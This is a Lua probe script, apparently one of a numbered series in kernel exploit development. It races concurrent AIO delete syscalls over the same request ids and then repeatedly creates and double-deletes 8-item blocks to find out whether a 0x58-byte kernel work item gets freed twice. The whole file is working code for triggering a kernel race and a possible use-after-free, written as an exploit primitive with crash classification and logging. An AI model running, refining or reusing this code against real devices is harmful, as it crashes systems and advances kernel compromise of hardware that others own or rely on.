-- CRASH_CLASS: HIGH
-- PROBE 572a: does the delete race duplicate a 0x58 work item?
--
-- Context: 568a's two racing helpers reported 0 for all 100 ids of one block
-- create. A serial repeat is always 0x80020003 (569a, 570a), so the second 0
-- comes from a caller that entered before the slot was cleared. In the multi
-- branch that caller also frees the work item W (0x58), so a real duplicate
-- free would hand the same chunk to two items of a later block create.
-- This probe races, then builds 8-item blocks and deletes them one by one: a
-- shared W shows up as a second 0 on an id that was already deleted, or as a
-- crash.

print("=== PROBE 572a: AIO WORK ITEM DUPLICATION ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end

local function page(n)
    local p = to_num(memory.alloc(n))
    for i = 0, n / 4 - 1 do wd(p + i * 4, 0) end
    return p
end

local reqs = page(0x2000)
local data = page(0x400)
local ids = page(0x100)
local one = page(0x40)
local states = page(0x40)
local status = page(0x400)
local CTX = page(0x40)
local RES = page(0x40)
local D = reqs + 0x100

local path = page(0x20)
wd(path, 0x7665642F) wd(path + 4, 0x6172752F) wd(path + 8, 0x6D6F646E) wd(path + 0xC, 0)
local fd = sgn(sc(5)(U(path), Z, Z, Z, Z, Z))
print(string.format("[0] fd=%d", fd))
if fd < 3 then print("=== 572a ABORT: no fd ===") return end

local function desc(at, len, buf, res)
    wq(at + 0x00, U(0)) wq(at + 0x08, U(len))
    wq(at + 0x10, U(buf)) wq(at + 0x18, U(res))
    wq(at + 0x20, U(fd)) wq(at + 0x28, U(0))
end

local function create(n, out)
    for i = 0, n - 1 do desc(D + i * 0x28, 0x10, data + (i % 8) * 0x40, RES + (i % 8) * 8) end
    wd(out, 0)
    return sgn(sc(669)(U(1 + 0x1000), U(D), U(n), U(1), U(out), Z)), rd(out)
end

local function poll(id)
    wd(one, id)
    pcall(function() sc(664)(U(one), U(1), U(states), Z, Z, Z) end)
    return rd(states)
end

local function del(id)
    wd(one, id)
    wd(status, 0xA5A5A5A5)
    local r = sgn(sc(662)(U(one), U(1), U(status), Z, Z, Z))
    return r, rd(status)
end

-- phase 1: build a race target and run two helpers over it
local RN = 100
local r, base = create(RN, ids)
print(string.format("[A] race target create ret=%d base=%s", r, hx(base)))
if r == 0 then
    for i = 0, RN - 1 do poll(base + i * 0x10000) end
    for i = 0, RN - 1 do wd(ids + i * 4, base + i * 0x10000) end
    for o = 0, 0x3F, 4 do wd(CTX + o, 0) end
    local HELPER = [==[
local IDS, N, STATUS, CTX, DONE = !IDS!, !N!, !STATUS!, !CTX!, !DONE!
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function U(a)
    a = to_num(a)
    local hi = math.floor(a / 4294967296)
    return uint64(string.format("0x%08X%08X", hi, a - hi * 4294967296))
end
local f = make_syscall(662)
pcall(function() return f(U(IDS), U(N), U(STATUS), uint64(0), uint64(0), uint64(0)) end)
pcall(function() memory.write_dword(CTX + DONE, 1) end)
]==]
    local S0 = page(0x200)
    local S1 = page(0x200)
    local function build(status, done)
        local b = HELPER
        b = b:gsub("!IDS!", tostring(ids))
        b = b:gsub("!N!", tostring(RN))
        b = b:gsub("!STATUS!", tostring(status))
        b = b:gsub("!CTX!", tostring(CTX))
        b = b:gsub("!DONE!", tostring(done))
        return b
    end
    local ok0 = pcall(function() return run_lua_code_in_new_thread(build(S0, 8), { async = true }) end)
    local ok1 = pcall(function() return run_lua_code_in_new_thread(build(S1, 12), { async = true }) end)
    print(string.format("[B] helpers spawned %s %s", tostring(ok0), tostring(ok1)))
    local waited = 0
    while (rd(CTX + 8) == 0 or rd(CTX + 12) == 0) and waited < 400 do waited = waited + 1 end
    local both = 0
    for i = 0, RN - 1 do
        if rd(S0 + i * 4) == 0 and rd(S1 + i * 4) == 0 then both = both + 1 end
    end
    print(string.format("[C] ids with two successes=%d", both))
end

-- phase 2: 8-item blocks, delete every item once, then again
for round = 1, 6 do
    local rr, b2 = create(8, ids)
    if rr ~= 0 then
        print(string.format("[D] round %d create ret=%d", round, rr))
    else
        local polled = 0
        for i = 0, 7 do if poll(b2 + i * 0x10000) == 3 then polled = polled + 1 end end
        local zeros, gone, other, second = 0, 0, 0, 0
        for i = 0, 7 do
            local dr, st = del(b2 + i * 0x10000)
            if dr == 0 and st == 0 then zeros = zeros + 1
            elseif st == 0x80020003 then gone = gone + 1
            else other = other + 1 end
        end
        for i = 0, 7 do
            local dr, st = del(b2 + i * 0x10000)
            if st == 0 then second = second + 1 end
        end
        print(string.format("[D] round %d base=%s polled=%d zeros=%d gone=%d other=%d second-zero=%d",
            round, hx(b2), polled, zeros, gone, other, second))
    end
end

print(string.format("[E] alive=%s", tostring(pcall(function() return sc(20)() end))))
print("=== 572a DONE ===")
